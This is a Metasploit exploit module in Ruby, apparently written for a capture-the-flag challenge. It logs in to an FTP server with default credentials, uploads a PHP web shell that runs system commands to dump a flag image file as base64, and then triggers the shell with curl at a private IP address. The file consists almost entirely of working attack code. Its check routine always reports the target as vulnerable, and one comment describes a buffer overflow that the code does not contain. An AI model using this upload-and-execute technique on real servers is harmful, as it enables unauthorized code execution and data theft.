##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = NormalRanking

  include Exploit::Remote::Tcp
  include Msf::Exploit::Remote::Ftp


  def initialize(info = {})
    super(
      update_info(
        info,
        'Name'           => 'stealthcopter msfhack',
        'Description'    => %q(
            stealthcopter attack!!!.
        ),
        'License'        => MSF_LICENSE,
        'Author'         => ['stealthcopter'],
      'Platform'       => 'unix',
      'Arch'        => ARCH_CMD, 
        'Targets'        =>
            [
            [ 'Automatic',  { } ]
            ],
        'DefaultTarget'  => 0,            
      )
    )
    
    register_options(
    [
        OptString.new('FTPUSER', [ true, 'Valid FTP username', 'ftpuser' ]),
        OptString.new('FTPPASS', [ true, 'Valid FTP password for username', 'ftpuser' ])
    ])        
  end

  #
  # The sample exploit just indicates that the remote host is always
  # vulnerable.
  #
  def check
    Exploit::CheckCode::Vulnerable
  end

  
  #
  # The exploit method connects to the remote service and sends 1024 random bytes
  # followed by the fake return address and then the payload.
  #
  def exploit
      
    print_status("HELLO")
    print_status("connecting to ftp")
    
    conn = connect_login
    if conn
        print_good("FTP - Login succeeded")
        
        result = send_cmd_data(["LS"], "A")
        print_status("LS response: #{result.inspect}")

        out = send_cmd(['CWD', 'files'], true)
        print_status(out)
        
        out = send_cmd(['TYPE', 'a'], true)
        
        # We can insert #{payload.encoded} into system, but for now lets do a dirty hack to get what we want
        php_file = "<?php system(\"md5sum /var/www/5_of_clubs.png; base64 /var/www/5_of_clubs.png\");?>"
        
        result = send_cmd_data(["PUT", "shell.php"], php_file, "I")
        print_status("PUT response: #{result.inspect}")
                
        result = send_cmd_data(["LS"], "A")
        print_status("LS response: #{result.inspect}")
        
        
        # Lets just use curl to execute as Http and Ftp includes dont play nice together
        print_status("\n\nNow triggering shell...")
        value = %x( curl http://172.19.0.2/files/shell.php )
        print_status(value)
        
    else
        print_status("FTP - Login failed")
    end
        
    handler
  end
end
